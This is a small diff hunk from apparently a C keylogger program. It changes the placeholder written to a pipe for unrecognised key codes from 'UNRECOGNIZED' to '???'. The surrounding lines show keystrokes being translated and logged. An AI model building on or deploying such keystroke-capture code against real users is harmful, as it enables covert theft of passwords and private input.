@@ -103,7 +103,7 @@ void keylogger(int keyboard, int write_pipe) {
                     const char *toWrite = keycodes[events[i].code];
                     write(write_pipe, toWrite, strlen(toWrite) + 1);
                 } else {
-                    write(write_pipe, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
+                    write(write_pipe, "???", sizeof("???"));
                 }
                 write(write_pipe, "  ", sizeof("  "));
             }
